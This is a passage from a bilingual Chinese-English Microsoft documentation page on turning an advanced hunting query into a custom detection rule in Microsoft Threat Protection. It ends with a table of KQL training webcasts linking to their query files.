1.  <span data-ttu-id="b1ae0-344">在 [查詢] 頁面上，移除 [前往搜尋指示] 的步驟7中所新增的行7和8，然後按一下 [ **建立偵測規則**]。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-344">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![可在 [高級搜尋] 頁面中按一下 [建立偵測規則] 的螢幕擷取畫面](../../media/mtp/fig22.png) 

    > [!NOTE]
    > <span data-ttu-id="b1ae0-346">如果您按一下 [ **建立偵測規則** ]，並在查詢中有語法錯誤，則您的偵測規則不會儲存。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-346">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="b1ae0-347">請加倍檢查您的查詢，確定沒有任何錯誤。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-347">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="b1ae0-348">請填入必要的欄位，其中包含可讓安全性小組瞭解提醒的資訊、它的產生原因，以及您預期採取的動作。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-348">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![[建立偵測規則] 頁面的螢幕擷取畫面，您可以在其中定義警示詳細資料](../../media/mtp/fig23.png)

    <span data-ttu-id="b1ae0-350">請務必以清晰的方式填寫欄位，以協助下一使用者對此偵測規則警示作出明智的決定。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-350">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="b1ae0-351">選取此警示會影響哪些實體。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-351">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="b1ae0-352">在此情況下，請選取 [ **裝置** 和 **信箱**]。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-352">In this case, select **Device** and **Mailbox**.</span></span>

    ![[建立偵測規則] 頁面的螢幕擷取畫面，您可以在其中選擇受影響實體的參數](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="b1ae0-354">決定觸發警示時應執行的動作。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-354">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="b1ae0-355">在此情況下，請執行防病毒掃描，但可以採取其他動作。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-355">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![[建立偵測規則] 頁面的螢幕擷取畫面，您可以在其中觸發警示時執行防病毒掃描，以協助解決威脅](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="b1ae0-357">選取警示規則的範圍。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-357">Select the scope for the alert rule.</span></span> <span data-ttu-id="b1ae0-358">因為此查詢包含裝置，所以裝置群組會在此自訂偵測中根據 Microsoft Defender ATP 內容而相關。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-358">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender ATP context.</span></span>  <span data-ttu-id="b1ae0-359">當您建立未包括裝置作為受影響實體的自訂偵測時，不適用範圍。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-359">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![[建立偵測規則] 頁面的螢幕擷取畫面，您可以在其中設定警示規則的範圍，以管理您將看到的結果預期](../../media/mtp/fig26.png) 

    <span data-ttu-id="b1ae0-361">在此試驗中，您可能會想要將此規則限制在實際執行環境中的測試裝置子集。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-361">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="b1ae0-362">選取 **[建立]**。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-362">Select **Create**.</span></span> <span data-ttu-id="b1ae0-363">然後，選取導覽窗格中的 **自訂偵測規則** 。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-363">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![功能表中自訂偵測規則選項的螢幕擷取畫面](../../media/mtp/fig27a.png) 

    ![顯示規則和執行詳細資料之 [偵測規則] 頁面的螢幕擷取畫面](../../media/mtp/fig27b.png) 

<span data-ttu-id="b1ae0-366">在此頁面中，您可以選取將會開啟詳細資料頁面的偵測規則。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-366">From this page, you can select the detection rule, which will open a details page.</span></span> 

    ![Screenshot of the email attachments page where you can see the status of the rule execution, triggered alerts and actions, edit the detection, and so on](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="b1ae0-367">其他的高級搜尋指導-透過練習</span><span class="sxs-lookup"><span data-stu-id="b1ae0-367">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="b1ae0-368">若要深入瞭解「高級搜尋」，下列網路廣播會逐步引導您透過 Microsoft 威脅防護 (MTP) 中的「高級搜尋」功能，以建立跨 pillar 查詢、pivot 至實體，以及建立自訂偵測和修正動作。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-368">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft Threat Protection (MTP) to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="b1ae0-369">請使用您自己的 GitHub 帳戶進行準備，以在試驗測試實驗室環境中執行搜尋查詢。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-369">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

|  <span data-ttu-id="b1ae0-370">職稱</span><span class="sxs-lookup"><span data-stu-id="b1ae0-370">Title</span></span>  |  <span data-ttu-id="b1ae0-371">描述</span><span class="sxs-lookup"><span data-stu-id="b1ae0-371">Description</span></span>  |  <span data-ttu-id="b1ae0-372">下載所用的</span><span class="sxs-lookup"><span data-stu-id="b1ae0-372">Download MP4</span></span>  |  <span data-ttu-id="b1ae0-373">手錶 YouTube</span><span class="sxs-lookup"><span data-stu-id="b1ae0-373">Watch on YouTube</span></span>  |  <span data-ttu-id="b1ae0-374">要使用的 CSL 檔案</span><span class="sxs-lookup"><span data-stu-id="b1ae0-374">CSL file to use</span></span>  |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="b1ae0-375">第1集： KQL 基礎</span><span class="sxs-lookup"><span data-stu-id="b1ae0-375">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="b1ae0-376">我們將涵蓋 Microsoft 威脅防護中高級搜尋功能的基礎知識。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-376">We’ll cover the basics of advanced hunting capabilities in Microsoft Threat Protection.</span></span> <span data-ttu-id="b1ae0-377">深入瞭解可用的高級搜尋資料和基本 KQL 語法及運算子。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-377">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="b1ae0-378"> 時</span><span class="sxs-lookup"><span data-stu-id="b1ae0-378"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="b1ae0-379">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1ae0-379">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="b1ae0-380">第1集： Git 中的 CSL 檔案</span><span class="sxs-lookup"><span data-stu-id="b1ae0-380">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="b1ae0-381">劇集2：聯接</span><span class="sxs-lookup"><span data-stu-id="b1ae0-381">Episode 2: Joins</span></span> | <span data-ttu-id="b1ae0-382">我們將繼續深入瞭解高級搜尋中的資料，以及如何將資料表結合在一起。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-382">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="b1ae0-383">瞭解內部、外部、unique 和半圓的連接，以及預設 Kusto innerunique join 的細微差別。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-383">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="b1ae0-384">時</span><span class="sxs-lookup"><span data-stu-id="b1ae0-384">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="b1ae0-385">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1ae0-385">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="b1ae0-386">劇集2： Git 中的 CSL 檔案</span><span class="sxs-lookup"><span data-stu-id="b1ae0-386">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="b1ae0-387">第3集：匯總、切換和視覺化資料</span><span class="sxs-lookup"><span data-stu-id="b1ae0-387">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="b1ae0-388">現在，我們可以篩選、處理及加入資料，這是時間開始摘要、量化、旋轉及形象。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-388">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="b1ae0-389">在此過程中，我們將涵蓋匯總運算子和您可以執行的一些計算，同時深入探討高級搜尋架構中的其他表格。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-389">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="b1ae0-390">我們會將資料集變成圖表，以協助改善分析。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-390">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="b1ae0-391">時</span><span class="sxs-lookup"><span data-stu-id="b1ae0-391">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="b1ae0-392">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1ae0-392">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="b1ae0-393">第3集： Git 中的 CSL 檔案</span><span class="sxs-lookup"><span data-stu-id="b1ae0-393">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="b1ae0-394">第4集：讓我們尋找！</span><span class="sxs-lookup"><span data-stu-id="b1ae0-394">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="b1ae0-395">將 KQL 套用至事件追蹤</span><span class="sxs-lookup"><span data-stu-id="b1ae0-395">Applying KQL to incident tracking</span></span>|<span data-ttu-id="b1ae0-396">追蹤某些攻擊者活動的時間！</span><span class="sxs-lookup"><span data-stu-id="b1ae0-396">Time to track some attacker activity!</span></span> <span data-ttu-id="b1ae0-397">在此期間，我們將使用 Microsoft 威脅防護中深入瞭解的 KQL 和高級搜尋來追蹤攻擊。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-397">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft Threat Protection to track an attack.</span></span> <span data-ttu-id="b1ae0-398">深入瞭解此欄位中所用的部分秘訣，以追蹤攻擊者的活動，包括 cybersecurity 的 ABCs，以及如何將其套用至事件回應。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-398">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="b1ae0-399">時</span><span class="sxs-lookup"><span data-stu-id="b1ae0-399">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="b1ae0-400">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1ae0-400">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="b1ae0-401">第4集： Git 中的 CSL 檔案</span><span class="sxs-lookup"><span data-stu-id="b1ae0-401">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="b1ae0-402">下一步</span><span class="sxs-lookup"><span data-stu-id="b1ae0-402">Next step</span></span>
|<span data-ttu-id="b1ae0-403">![關閉及摘要階段](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="b1ae0-403">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="b1ae0-404">關閉及摘要階段</span><span class="sxs-lookup"><span data-stu-id="b1ae0-404">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="b1ae0-405">分析您的 Microsoft 威脅防護試驗結果，將其呈現給您的專案關係人，然後採取下一個步驟。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-405">Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

